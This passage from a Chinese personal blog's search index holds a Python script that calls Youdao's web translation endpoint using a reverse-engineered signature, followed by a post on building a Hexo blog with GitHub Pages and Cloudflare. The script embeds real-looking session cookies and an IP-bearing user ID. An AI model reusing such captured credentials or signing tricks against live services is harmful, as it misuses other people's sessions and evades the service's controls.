9PhwKfsA7pYeU2EJLRrRK42WQpEy0Xwx_2Lz2e3Rlf-L467aRO7RmuvBXD-J_H0IwaArTP7K3_ZeSUzEvCicixstp94kzkLHCsyJHZXiR3YTq3t7lmNgpfDbb-&#x27;));</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> execjs<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><br><br><br>cookies = &#123;<br>    <span class="hljs-string">&#x27;OUTFOX_SEARCH_USER_ID&#x27;</span>: <span class="hljs-string">&#x27;-39140274@218.106.117.234&#x27;</span>,<br>    <span class="hljs-string">&#x27;OUTFOX_SEARCH_USER_ID_NCOO&#x27;</span>: <span class="hljs-string">&#x27;1017813054.5103312&#x27;</span>,<br>    <span class="hljs-string">&#x27;DICT_DOCTRANS_SESSION_ID&#x27;</span>: <span class="hljs-string">&#x27;NGI5MmMzZTktYmY5ZS00Njg1LTkwODMtODZlZjI2OTA5YzZh&#x27;</span>,<br>    <span class="hljs-string">&#x27;_uetsid&#x27;</span>: <span class="hljs-string">&#x27;b1a3a4202e6211f09ed8910f851b0f84&#x27;</span>,<br>    <span class="hljs-string">&#x27;_uetvid&#x27;</span>: <span class="hljs-string">&#x27;0a3206b0b5e211ef97071f44ad9eeb40&#x27;</span>,<br>&#125;<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ar;q=0.5&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>    <span class="hljs-string">&#x27;DNT&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;https://fanyi.youdao.com&#x27;</span>,<br>    <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;https://fanyi.youdao.com/&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;cors&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-site&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua&#x27;</span>: <span class="hljs-string">&#x27;&quot;Chromium&quot;;v=&quot;136&quot;, &quot;Microsoft Edge&quot;;v=&quot;136&quot;, &quot;Not.A/Brand&quot;;v=&quot;99&quot;&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="hljs-string">&#x27;?0&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="hljs-string">&#x27;&quot;Windows&quot;&#x27;</span>,<br>    <span class="hljs-comment"># &#x27;Cookie&#x27;: &#x27;OUTFOX_SEARCH_USER_ID=-39140274@218.106.117.234; OUTFOX_SEARCH_USER_ID_NCOO=1017813054.5103312; DICT_DOCTRANS_SESSION_ID=NGI5MmMzZTktYmY5ZS00Njg1LTkwODMtODZlZjI2OTA5YzZh; _uetsid=b1a3a4202e6211f09ed8910f851b0f84; _uetvid=0a3206b0b5e211ef97071f44ad9eeb40&#x27;,</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">youdao</span>(<span class="hljs-params">txt</span>):<br>    jscode = execjs.<span class="hljs-built_in">compile</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;translate.js&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read())  <span class="hljs-comment">#导入刚才写的js文件</span><br>    time_now,sign = jscode.call(<span class="hljs-string">&quot;getsign&quot;</span>)                                  <span class="hljs-comment">#调用js文件中的方法,得到time_now和sign</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;i&#x27;</span>: txt,<br>        <span class="hljs-string">&#x27;from&#x27;</span>: <span class="hljs-string">&#x27;zh-CHS&#x27;</span>,<br>        <span class="hljs-string">&#x27;to&#x27;</span>: <span class="hljs-string">&#x27;en&#x27;</span>,<br>        <span class="hljs-string">&#x27;useTerm&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>        <span class="hljs-string">&#x27;domain&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;dictResult&#x27;</span>: <span class="hljs-string">&#x27;true&#x27;</span>,<br>        <span class="hljs-string">&#x27;keyid&#x27;</span>: <span class="hljs-string">&#x27;webfanyi&#x27;</span>,<br>        <span class="hljs-string">&#x27;sign&#x27;</span>: sign,<br>        <span class="hljs-string">&#x27;client&#x27;</span>: <span class="hljs-string">&#x27;fanyideskweb&#x27;</span>,<br>        <span class="hljs-string">&#x27;product&#x27;</span>: <span class="hljs-string">&#x27;webfanyi&#x27;</span>,<br>        <span class="hljs-string">&#x27;appVersion&#x27;</span>: <span class="hljs-string">&#x27;1.0.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;vendor&#x27;</span>: <span class="hljs-string">&#x27;web&#x27;</span>,<br>        <span class="hljs-string">&#x27;pointParam&#x27;</span>: <span class="hljs-string">&#x27;client,mysticTime,product&#x27;</span>,<br>        <span class="hljs-string">&#x27;mysticTime&#x27;</span>: time_now,<br>        <span class="hljs-string">&#x27;keyfrom&#x27;</span>: <span class="hljs-string">&#x27;fanyi.web&#x27;</span>,<br>        <span class="hljs-string">&#x27;mid&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;screen&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;model&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;network&#x27;</span>: <span class="hljs-string">&#x27;wifi&#x27;</span>,<br>        <span class="hljs-string">&#x27;abtest&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;yduuid&#x27;</span>: <span class="hljs-string">&#x27;abcdefg&#x27;</span>,<br>    &#125;<br>    response = requests.post(<span class="hljs-string">&#x27;https://dict.youdao.com/webtranslate&#x27;</span>, <br>                             cookies=cookies, <br>                             headers=headers, <br>                             data=data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).text<br>    <span class="hljs-comment">#print(response)</span><br><br>    result = jscode.call(<span class="hljs-string">&#x27;translate_response&#x27;</span>,response)<br>    <span class="hljs-comment">#print(result)</span><br>    translate = result[<span class="hljs-string">&#x27;translateResult&#x27;</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;tgt&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;翻译结果为：<span class="hljs-subst">&#123;translate&#125;</span>&#x27;</span>)<br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    txt = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入要翻译的内容：&#x27;</span>)<br>    youdao(txt)<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>js逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建个人博客</title>
    <link href="/2025/05/18/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2025/05/18/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="工具：Cloudflare-GitHub-Hexo-Fluid"><a href="#工具：Cloudflare-GitHub-Hexo-Fluid" class="headerlink" title="工具：Cloudflare+GitHub+Hexo Fluid"></a>工具：Cloudflare+GitHub+Hexo Fluid</h1><h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><p>hexo 是一个快速、简洁，而且功能强大的静态博客框架。我们可以使用 Markdown 编写博客文章，然后 hexo 帮我们把 Markdown 文件渲染成静态 HTML 页面。因此 hexo 非常适合用来搭建技术类博客，以及项目文档和个人网站。</p><p>需要安装node.js依赖</p><h2 id="github托管"><a href="#github托管" class="headerlink" title="github托管"></a>github托管</h2><p>将博客项目托管到github仓库，并使用Github pages来部署博客，可以让其他人也访问该博客。</p><h2 id="Cloudflare"><a href="#Cloudflare" class="headerlink" title="Cloudflare"></a>Cloudflare</h2><p>使用cloudflare加速国内用户访问速度。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>dash.cloudflare.com<span class="hljs-regexp">/062413ad293e022e2f66f461b1a256f6/</span>pages<span class="hljs-regexp">/view/</span>jimi-lab-github-io<br></code></pre></td></tr></table></figure><h2 id="修改Hexo主题"><a href="#修改Hexo主题" class="headerlink" title="修改Hexo主题"></a>修改Hexo主题</h2><p>我选择Fluid主题，再加一些个性化的设计，大家可以自行选择。</p><h2 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a>添加评论功能</h2><p>使用github utterances插件</p><h2 id="md中添加截图"><a href="#md中添加截图" class="headerlink" title="md中添加截图"></a>md中添加截图</h2><p>cursor中使用了Paste Image插件。<br>F1截图之后，Ctrl+Alt+V,直接粘贴到特定目录，并在当前md文档中引用该图片。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="发布新文章"><a href="#发布新文章" class="headerlink" title="发布新文章"></a>发布新文章</h2><p>1.在Hexo项目根目录下使用命令：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;Hello World&quot;</span><br></code></pre></td></tr></table></figure><p>使用该命令会在文件中自动生成文件头。<br>2.这样会在 source&#x2F;_posts&#x2F; 目录下自动生成一个 Hello-World.md 的新文章文件。你只需要编辑这个 Markdown 文件，写入你的内容即可。</p><h4 id="将语雀文档同步到个人博客："><a href="#将语雀文档同步到个人博客：" class="headerlink" title="将语雀文档同步到个人博客："></a>将语雀文档同步到个人博客：</h4><p>1.将语雀文章以md格式导出。<br>2.将导出的文件复制粘贴进Hello-World.md文件（直接将导出的文件拖入source&#x2F;_posts&#x2F; 目录也可以）<br>3.运行：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">R:\MyProject\MyBlog\my-blog&gt;<span class="hljs-keyword">python</span> yuque.<span class="hljs-keyword">py</span> Hello-World.md<br></code></pre></td></tr></table></figure><p>（这条命令会将Hello-World.md中的cdn链接转储到本地source&#x2F;img&#x2F;Hello-World目录下并在Hello-World.md更改引用本地图片）</p><p>运行以下命令可在本地查看编辑效果。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">hexo <span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>3.完成内容创作之后，运行：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">hexo clean &amp;&amp; hexo <span class="hljs-keyword">generate</span> &amp;&amp; hexo deploy<br></code></pre></td></tr></table></figure><p>该命令会将本地的仓库的内容同步到GitHub。</p><hr><p>最终URL：<br>github：<a href="https://jimi-lab.github.io/">https://jimi-lab.github.io/</a><br>cloudflare：<a href="https://jimi-lab-github-io.pages.dev/">https://jimi-lab-github-io.pages.dev/</a></p><p>最终效果图如下：<br><img src = "/img/搭建个人博客/background.png"></p><p><strong>报错信息汇总</strong>：</p><p>1.如果遇到以下错误：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs subunit">Please make sure you have the correct access rights<br>and the repository exists.<br>FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html<br><span class="hljs-keyword">Error: </span>Spawn failed<br>    at ChildProcess.&lt;anonymous&gt; (R:\MyProject\MyBlog\my-blog\node_modules\hexo-deployer-git\node_modules\hexo-util\lib\spawn.js:51:21)<br>    at ChildProcess.emit (node:events:524:28)<br>    at cp.emit (R:\MyProject\MyBlog\my-blog\node_modules\cross-spawn\lib\enoent.js:34:29)<br>    at ChildProcess._handle.onexit (node:internal/child_process:293:12)<br></code></pre></td></tr></table></figure><p>可能是因为ssh连接github时候连接不上报错，可以尝试打开代理&#x2F;电脑使用自己手机热点&#x2F;等方法解决。</p>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
